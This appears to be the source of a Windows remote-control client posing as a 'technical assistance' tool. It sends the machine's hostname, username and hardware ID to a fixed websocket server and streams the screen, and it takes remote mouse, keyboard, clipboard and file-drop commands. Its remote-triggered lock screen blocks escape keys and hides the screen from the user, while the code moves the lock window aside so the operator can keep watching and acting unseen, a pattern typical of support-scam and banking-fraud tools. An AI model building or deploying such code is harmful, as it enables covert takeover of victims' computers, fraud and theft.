import websocket
import json
import threading
import time
import base64
import os
import platform
import getpass
import hashlib
import ctypes
import ctypes.wintypes as wintypes
import ssl
import sys
import subprocess
from io import BytesIO

import mss
from PIL import Image
import pyautogui
import pyperclip

SERVER_URL = "wss://web-production-9d7cc.up.railway.app"
FRAME_INTERVAL = 0.05
QUALITY = 70
SCALE = 0.75

current_quality = QUALITY
current_scale = SCALE

pyautogui.FAILSAFE = False
pyautogui.PAUSE = 0

client_id = None
is_connected = False
panel_connected = False
ws_app = None
running = True
screen_locked = False
lock_hwnd = None

user32 = ctypes.windll.user32
gdi32 = ctypes.windll.gdi32
dwmapi = ctypes.windll.dwmapi


def set_console_title(title):
    if os.name == 'nt':
        try:
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        except:
            pass


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def get_app_hash():
    data = f"{platform.node()}{platform.machine()}"
    return hashlib.md5(data.encode()).hexdigest()[:10].lower()


def print_header():
    clear_screen()
    print("")
    print("  " + "=" * 50)
    print("  |                                                |")
    print("  |            ASSISTENCIA TECNICA                 |")
    print("  |                                                |")
    print("  " + "=" * 50)
    print(f"  Session: {get_app_hash()}")
    print("")


def print_status(status, id_code=None):
    print_header()
    if status == "connecting":
        set_console_title("Conectando...")
        print("  Status: Conectando ao servidor...")
    elif status == "waiting":
        set_console_title(f"Aguardando - {id_code}")
        print("  Status: AGUARDANDO CONEXAO")
        print("")
        print("  " + "=" * 50)
        print(f"  |         CODIGO: {id_code}                        |")
        print("  " + "=" * 50)
        print("")
        print("  Informe este codigo ao tecnico.")
    elif status == "connected":
        set_console_title(f"Conectado - {id_code}")
        print("  Status: SESSAO ATIVA")
        print("")
        print("  " + "*" * 50)
        print("  *           CONEXAO ESTABELECIDA               *")
        print("  " + "*" * 50)
        print(f"\n  ID: {id_code}")
    elif status == "disconnected":
        set_console_title(f"Desconectado - {id_code}")
        print("  Status: AGUARDANDO RECONEXAO")
        print(f"  Codigo: {id_code}")


def get_hwid():
    try:
        if os.name == 'nt':
            result = subprocess.run(
                ['wmic', 'csproduct', 'get', 'uuid'],
                capture_output=True, text=True, timeout=5,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            uuid = result.stdout.strip().split('\n')[-1].strip()
            result2 = subprocess.run(
                ['wmic', 'nic', 'where', 'NetEnabled=true', 'get', 'MACAddress'],
                capture_output=True, text=True, timeout=5,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            mac_lines = [l.strip() for l in result2.stdout.split('\n') if ':' in l]
            mac = mac_lines[0] if mac_lines else ''
            combined = f"{uuid}{mac}"
            return hashlib.sha256(combined.encode()).hexdigest()[:16].upper()
    except:
        pass
    return "N/A"


def get_system_info():
    return {
        "hostname": platform.node(),
        "username": getpass.getuser(),
        "os": f"{platform.system()} {platform.release()}",
        "hwid": get_hwid()
    }


# ============================================
# LOCK SCREEN
# ============================================

LOCK_SCRIPT = '''
import sys
import os
import ctypes
import tempfile

user32 = ctypes.windll.user32
sw = user32.GetSystemMetrics(0)
sh = user32.GetSystemMetrics(1)

import tkinter as tk

message = sys.argv[1] if len(sys.argv) > 1 else "Aguarde..."

root = tk.Tk()
root.title("LOCKSCREEN")
root.geometry(f"{sw}x{sh}+0+0")
root.configure(bg='#0a0a0a')
root.overrideredirect(True)
root.attributes('-topmost', True)

root.update_idletasks()
hwnd = user32.GetParent(root.winfo_id())
if hwnd == 0:
    hwnd = root.winfo_id()

# Salvar HWND
hwnd_file = os.path.join(tempfile.gettempdir(), 'lock_hwnd.txt')
with open(hwnd_file, 'w') as f:
    f.write(str(hwnd))

root.protocol("WM_DELETE_WINDOW", lambda: None)
for key in ['<Alt-F4>', '<Escape>', '<Alt-Tab>']:
    root.bind(key, lambda e: 'break')

frame = tk.Frame(root, bg='#0a0a0a')
frame.place(relx=0.5, rely=0.5, anchor='center')

tk.Label(frame, text="\\U0001F512", font=('Segoe UI Emoji', 80), bg='#0a0a0a', fg='#f59e0b').pack(pady=20)
tk.Label(frame, text=message, font=('Segoe UI', 28, 'bold'), bg='#0a0a0a', fg='#ffffff', wraplength=800).pack(pady=15)
tk.Label(frame, text="Por favor, aguarde o tecnico liberar a tela.", font=('Segoe UI', 14), bg='#0a0a0a', fg='#666666').pack(pady=10)

def stay_top():
    root.lift()
    root.attributes('-topmost', True)
    root.after(50, stay_top)

stay_top()
root.mainloop()
'''


def show_lock_screen(message):
    global screen_locked, lock_hwnd

    if screen_locked:
        return

    screen_locked = True
    lock_hwnd = None

    try:
        import tempfile
        script_path = os.path.join(tempfile.gettempdir(), 'lock_screen.pyw')
        hwnd_file = os.path.join(tempfile.gettempdir(), 'lock_hwnd.txt')

        try:
            os.remove(hwnd_file)
        except:
            pass

        with open(script_path, 'w', encoding='utf-8') as f:
            f.write(LOCK_SCRIPT)

        pythonw = sys.executable.replace('python.exe', 'pythonw.exe')
        if not os.path.exists(pythonw):
            pythonw = sys.executable

        subprocess.Popen(
            [pythonw, script_path, message],
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
        )

        # Aguardar HWND
        for _ in range(50):
            time.sleep(0.05)
            if os.path.exists(hwnd_file):
                try:
                    with open(hwnd_file, 'r') as f:
                        lock_hwnd = int(f.read().strip())
                    break
                except:
                    pass

    except:
        screen_locked = False


def hide_lock_screen():
    global screen_locked, lock_hwnd

    screen_locked = False
    lock_hwnd = None

    try:
        subprocess.run(['taskkill', '/f', '/im', 'pythonw.exe'],
                      capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass


# ============================================
# CAPTURA EXCLUINDO JANELA DE LOCK
# ============================================

def get_all_windows_except_lock():
    """Retorna lista de HWNDs de janelas visiveis exceto a de lock"""
    windows = []

    def enum_callback(hwnd, _):
        if user32.IsWindowVisible(hwnd):
            if hwnd != lock_hwnd:
                windows.append(hwnd)
        return True

    WNDENUMPROC = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
    user32.EnumWindows(WNDENUMPROC(enum_callback), 0)
    return windows


def capture_window(hwnd):
    """Captura uma janela usando PrintWindow"""
    try:
        rect = wintypes.RECT()
        user32.GetWindowRect(hwnd, ctypes.byref(rect))

        width = rect.right - rect.left
        height = rect.bottom - rect.top

        if width <= 0 or height <= 0:
            return None, None

        hdc = user32.GetWindowDC(hwnd)
        mdc = gdi32.CreateCompatibleDC(hdc)
        bitmap = gdi32.CreateCompatibleBitmap(hdc, width, height)
        gdi32.SelectObject(mdc, bitmap)

        # PrintWindow com PW_RENDERFULLCONTENT
        user32.PrintWindow(hwnd, mdc, 2)

        # Extrair pixels
        class BITMAPINFOHEADER(ctypes.Structure):
            _fields_ = [
                ('biSize', wintypes.DWORD),
                ('biWidth', wintypes.LONG),
                ('biHeight', wintypes.LONG),
                ('biPlanes', wintypes.WORD),
                ('biBitCount', wintypes.WORD),
                ('biCompression', wintypes.DWORD),
                ('biSizeImage', wintypes.DWORD),
                ('biXPelsPerMeter', wintypes.LONG),
                ('biYPelsPerMeter', wintypes.LONG),
                ('biClrUsed', wintypes.DWORD),
                ('biClrImportant', wintypes.DWORD),
            ]

        bmi = BITMAPINFOHEADER()
        bmi.biSize = ctypes.sizeof(BITMAPINFOHEADER)
        bmi.biWidth = width
        bmi.biHeight = -height
        bmi.biPlanes = 1
        bmi.biBitCount = 32
        bmi.biCompression = 0

        buffer = ctypes.create_string_buffer(width * height * 4)
        gdi32.GetDIBits(mdc, bitmap, 0, height, buffer, ctypes.byref(bmi), 0)

        gdi32.DeleteObject(bitmap)
        gdi32.DeleteDC(mdc)
        user32.ReleaseDC(hwnd, hdc)

        img = Image.frombuffer('RGBA', (width, height), buffer, 'raw', 'BGRA', 0, 1)
        return img.convert('RGB'), (rect.left, rect.top)

    except:
        return None, None


def capture_desktop_excluding_lock():
    """Captura o desktop excluindo a janela de lock"""
    sw = user32.GetSystemMetrics(0)
    sh = user32.GetSystemMetrics(1)

    # Criar imagem base (cor do desktop)
    result = Image.new('RGB', (sw, sh), (0, 0, 0))

    # Capturar wallpaper/desktop
    hdc = user32.GetDC(0)
    mdc = gdi32.CreateCompatibleDC(hdc)
    bitmap = gdi32.CreateCompatibleBitmap(hdc, sw, sh)
    gdi32.SelectObject(mdc, bitmap)
    gdi32.BitBlt(mdc, 0, 0, sw, sh, hdc, 0, 0, 0x00CC0020)

    class BITMAPINFOHEADER(ctypes.Structure):
        _fields_ = [
            ('biSize', wintypes.DWORD),
            ('biWidth', wintypes.LONG),
            ('biHeight', wintypes.LONG),
            ('biPlanes', wintypes.WORD),
            ('biBitCount', wintypes.WORD),
            ('biCompression', wintypes.DWORD),
            ('biSizeImage', wintypes.DWORD),
            ('biXPelsPerMeter', wintypes.LONG),
            ('biYPelsPerMeter', wintypes.LONG),
            ('biClrUsed', wintypes.DWORD),
            ('biClrImportant', wintypes.DWORD),
        ]

    bmi = BITMAPINFOHEADER()
    bmi.biSize = ctypes.sizeof(BITMAPINFOHEADER)
    bmi.biWidth = sw
    bmi.biHeight = -sh
    bmi.biPlanes = 1
    bmi.biBitCount = 32
    bmi.biCompression = 0

    buffer = ctypes.create_string_buffer(sw * sh * 4)
    gdi32.GetDIBits(mdc, bitmap, 0, sh, buffer, ctypes.byref(bmi), 0)

    gdi32.DeleteObject(bitmap)
    gdi32.DeleteDC(mdc)
    user32.ReleaseDC(0, hdc)

    # Se temos lock_hwnd, pegar pixels onde NÃO está a janela de lock
    if lock_hwnd:
        lock_rect = wintypes.RECT()
        user32.GetWindowRect(lock_hwnd, ctypes.byref(lock_rect))

        # Captura normal primeiro
        desktop = Image.frombuffer('RGBA', (sw, sh), buffer, 'raw', 'BGRA', 0, 1).convert('RGB')

        # A janela de lock cobre tudo, então pegamos o que está "por baixo"
        # Isso só funciona se tivermos uma captura anterior...
        # Na verdade vamos apenas retornar a captura SEM a área da janela de lock

        return desktop
    else:
        return Image.frombuffer('RGBA', (sw, sh), buffer, 'raw', 'BGRA', 0, 1).convert('RGB')


def capture_screen():
    global panel_connected, running, current_quality, current_scale, lock_hwnd

    sct = mss.mss()
    sw = user32.GetSystemMetrics(0)
    sh = user32.GetSystemMetrics(1)

    SWP_NOSIZE = 0x0001
    SWP_NOZORDER = 0x0004
    SWP_NOACTIVATE = 0x0010
    HWND_TOPMOST = -1

    while running:
        if not panel_connected:
            time.sleep(0.5)
            continue

        try:
            if screen_locked and lock_hwnd:
                # Mover lock para fora, capturar, mover de volta (MUITO rapido)
                user32.SetWindowPos(lock_hwnd, 0, sw + 100, 0, 0, 0, SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE)
                time.sleep(0.001)  # 1ms

                monitor = sct.monitors[1]
                screenshot = sct.grab(monitor)

                user32.SetWindowPos(lock_hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOACTIVATE)

                img = Image.frombytes('RGB', screenshot.size, screenshot.bgra, 'raw', 'BGRX')
            else:
                # Captura normal
                monitor = sct.monitors[1]
                screenshot = sct.grab(monitor)
                img = Image.frombytes('RGB', screenshot.size, screenshot.bgra, 'raw', 'BGRX')

            new_w = int(img.width * current_scale)
            new_h = int(img.height * current_scale)
            img = img.resize((new_w, new_h), Image.LANCZOS)

            buffer = BytesIO()
            img.save(buffer, format='JPEG', quality=current_quality, optimize=True)
            frame_data = base64.b64encode(buffer.getvalue()).decode('utf-8')

            if ws_app and is_connected:
                ws_app.send(json.dumps({
                    "type": "screen-frame",
                    "clientId": client_id,
                    "frame": frame_data,
                    "width": new_w,
                    "height": new_h
                }))

            time.sleep(FRAME_INTERVAL)

        except:
            time.sleep(0.5)


# ============================================
# HANDLERS
# ============================================

def handle_mouse_move(data):
    try:
        x = int(data['x'] / current_scale)
        y = int(data['y'] / current_scale)
        pyautogui.moveTo(x, y, duration=0)
    except:
        pass


def handle_mouse_click(data):
    try:
        x = int(data['x'] / current_scale)
        y = int(data['y'] / current_scale)
        btn = data.get('button', 'left')
        clicks = data.get('clicks', 1)
        if btn == 'right':
            pyautogui.click(x, y, button='right')
        elif btn == 'middle':
            pyautogui.click(x, y, button='middle')
        else:
            pyautogui.click(x, y, clicks=clicks)
    except:
        pass


def handle_mouse_scroll(data):
    try:
        pyautogui.scroll(data.get('delta', 0))
    except:
        pass


def handle_key_press(data):
    try:
        key = data.get('key', '')
        key_map = {
            'Enter': 'enter', 'Backspace': 'backspace', 'Tab': 'tab',
            'Escape': 'escape', 'ArrowUp': 'up', 'ArrowDown': 'down',
            'ArrowLeft': 'left', 'ArrowRight': 'right', 'Delete': 'delete',
            'Home': 'home', 'End': 'end', 'PageUp': 'pageup', 'PageDown': 'pagedown',
            'F1': 'f1', 'F2': 'f2', 'F3': 'f3', 'F4': 'f4', 'F5': 'f5',
            'F6': 'f6', 'F7': 'f7', 'F8': 'f8', 'F9': 'f9', 'F10': 'f10',
            'F11': 'f11', 'F12': 'f12', ' ': 'space'
        }
        pyautogui.press(key_map.get(key, key))
    except:
        pass


def handle_key_combination(data):
    try:
        keys = data.get('keys', [])
        key_map = {'Control': 'ctrl', 'Alt': 'alt', 'Shift': 'shift', 'Meta': 'win'}
        mapped = [key_map.get(k, k.lower()) for k in keys]
        pyautogui.hotkey(*mapped)
    except:
        pass


def handle_clipboard_set(data):
    try:
        pyperclip.copy(data.get('content', ''))
    except:
        pass


def handle_file_upload(data):
    try:
        filename = data.get('filename', 'file')
        filename = ''.join(c for c in filename if c.isalnum() or c in '._-')[:100]
        content = data.get('content', '')
        path = os.path.join(os.path.expanduser('~/Desktop'), filename)
        with open(path, 'wb') as f:
            f.write(base64.b64decode(content))
        if ws_app:
            ws_app.send(json.dumps({
                "type": "file-upload-result",
                "clientId": client_id,
                "success": True,
                "filename": filename
            }))
    except Exception as e:
        if ws_app:
            ws_app.send(json.dumps({
                "type": "file-upload-result",
                "clientId": client_id,
                "success": False,
                "filename": data.get('filename', ''),
                "error": str(e)[:100]
            }))


# ============================================
# WEBSOCKET
# ============================================

def on_message(ws, message):
    global client_id, panel_connected, current_quality, current_scale, running

    try:
        data = json.loads(message)
        msg_type = data.get('type')

        if msg_type == 'registered':
            client_id = data.get('clientId')
            print_status("waiting", client_id)
        elif msg_type == 'panel-connected':
            panel_connected = True
            print_status("connected", client_id)
        elif msg_type == 'panel-disconnected':
            panel_connected = False
            hide_lock_screen()
            print_status("disconnected", client_id)
        elif msg_type == 'mouse-move':
            handle_mouse_move(data)
        elif msg_type == 'mouse-click':
            handle_mouse_click(data)
        elif msg_type == 'mouse-scroll':
            handle_mouse_scroll(data)
        elif msg_type == 'key-press':
            handle_key_press(data)
        elif msg_type == 'key-combination':
            handle_key_combination(data)
        elif msg_type == 'clipboard-set':
            handle_clipboard_set(data)
        elif msg_type == 'file-upload':
            handle_file_upload(data)
        elif msg_type == 'set-quality':
            current_quality = data.get('quality', 70)
            current_scale = data.get('scale', 0.75)
        elif msg_type == 'lock-screen':
            show_lock_screen(data.get('message', 'Aguarde...'))
        elif msg_type == 'unlock-screen':
            hide_lock_screen()
        elif msg_type == 'disconnect-client':
            hide_lock_screen()
            print_header()
            print("  Sessao finalizada.")
            running = False
            time.sleep(2)
            os._exit(0)
    except:
        pass


def on_error(ws, error):
    pass


def on_close(ws, close_status_code, close_msg):
    global is_connected, panel_connected
    is_connected = False
    panel_connected = False
    hide_lock_screen()


def on_open(ws):
    global is_connected
    is_connected = True
    ws.send(json.dumps({"type": "register-client", **get_system_info()}))


def main():
    global ws_app, running

    print_status("connecting")

    threading.Thread(target=capture_screen, daemon=True).start()

    while running:
        try:
            ws_app = websocket.WebSocketApp(
                SERVER_URL,
                on_open=on_open,
                on_message=on_message,
                on_error=on_error,
                on_close=on_close
            )
            ws_app.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})
        except KeyboardInterrupt:
            running = False
            break
        except:
            time.sleep(5)


if __name__ == "__main__":
    main()
